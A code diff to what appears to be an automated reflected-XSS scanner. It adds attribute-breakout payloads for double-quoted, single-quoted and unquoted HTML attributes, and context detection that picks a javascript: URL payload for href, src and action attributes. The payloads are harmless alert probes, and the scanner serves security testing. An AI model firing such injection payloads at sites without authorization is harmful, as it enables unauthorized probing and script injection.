@@ -90,6 +90,9 @@ def _gen_probe() -> str:
 _PAYLOADS: dict[str, str] = {
     "html_body":      '<svg/onload=alert("{token}")>',
     "html_attribute": '" onmouseover=alert(\'{token}\') x="',
+    "html_attribute_\"": '" onmouseover=alert(\'{token}\') x="',
+    "html_attribute_'": "' onmouseover=alert('{token}') x='",
+    "html_attribute_":  " onmouseover=alert('{token}') x=",
     "script_block":   '</script><script>alert("{token}")</script>',
     "url":            'javascript:alert("{token}")',
     "js_string":      '</script><script>alert("{token}")</script>',
@@ -146,9 +149,24 @@ def _detect_contexts(probe: str, body: str) -> list[str]:
         last_open = before.rfind("<")
         last_close = before.rfind(">")
         if last_open > last_close:
-            # We're inside an open tag
-            if re.search(r'=\s*["\']?$', before):
-                contexts.append("html_attribute")
+            # We're inside an open tag. URL-bearing attributes win over the
+            # generic attribute branch so we select the javascript: payload.
+            m_url = re.search(r'(?:href|src|action|formaction)\s*=\s*(["\']?)$', before, re.I)
+            if m_url:
+                contexts.append("url")
+                continue
+            # Otherwise it's a (possibly quoted) attribute value.
+            m_attr = re.search(r'=\s*(["\']?)$', before)
+            if m_attr:
+                q = m_attr.group(1)
+                # Distinguish the quoting style so we fire the right breakout
+                # payload: double-quoted, single-quoted, or unquoted attribute.
+                if q == '"':
+                    contexts.append('html_attribute_"')
+                elif q == "'":
+                    contexts.append("html_attribute_'")
+                else:
+                    contexts.append("html_attribute_")
             else:
                 # Still inside tag but not in attribute
                 contexts.append("html_tag")
